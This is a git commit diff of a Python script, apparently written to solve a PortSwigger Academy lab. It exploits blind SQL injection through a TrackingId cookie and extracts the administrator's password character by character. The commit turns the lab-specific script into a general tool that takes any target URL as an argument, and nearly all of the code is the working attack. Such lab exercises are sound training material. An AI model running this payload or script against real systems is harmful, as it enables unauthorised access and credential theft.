3137e0caab71eba816c144bfdba821b8d83ef7fa
Anas Ibrahim <78263620+0x0anas@users.noreply.github.com>
2024-02-17 19:33:13 +0200

    conditional_responses_blind_sqli.py

--- conditional_responses_blind_sqli.py
+++ conditional_responses_blind_sqli.py
@@ -1,16 +1,28 @@
+import argparse
 import requests
 import string
+
 #https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-conditional-responses/sql-injection/blind/lab-conditional-responses#
-url = "https://0ae7001604eb877d81331b8d005b0075.web-security-academy.net/filter?category=Gifts"
-admin_password = ''
-password_chars = ['a','b','c','d','e','f','g','h','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0','~','!','@','#','$','%','^','&','*','(',')','+','-','/']
-for i in range(1, 21):
-    for j in password_chars:
-        payload = f"'+OR+(SELECT+SUBSTRING(password,{i},1)+FROM+users+WHERE+username='administrator')='{j}"
-        cookies = {"TrackingId": payload}
-        response = requests.get(url, cookies=cookies)
-        found_char = j
-        if "welcome back" in response.text.lower():
-            admin_password += found_char
-            print(f"{i}, character {j}")
-print(admin_password)
+def main(url):
+    admin_password = ''
+    password_chars = string.ascii_lowercase + string.digits + '~!@#$%^&*()+-/'
+    for i in range(1, 21):
+        for j in password_chars:
+            payload = f"'+OR+(SELECT+SUBSTRING(password,{i},1)+FROM+users+WHERE+username='administrator')='{j}"
+            cookies = {"TrackingId": payload}
+            response = requests.get(url, cookies=cookies)
+            found_char = j
+            if "welcome back" in response.text.lower():
+                admin_password += found_char
+                print(f"{i}, character {j}")
+    print("administrator password: " + admin_password)
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description='Blind SQL Injection Exploit Script')
+    parser.add_argument('-u', '--url', help='URL argument')
+    args = parser.parse_args()
+
+    if args.url:
+        main(args.url)
+    else:
+        print("Please provide a URL using the -u or --url option.")
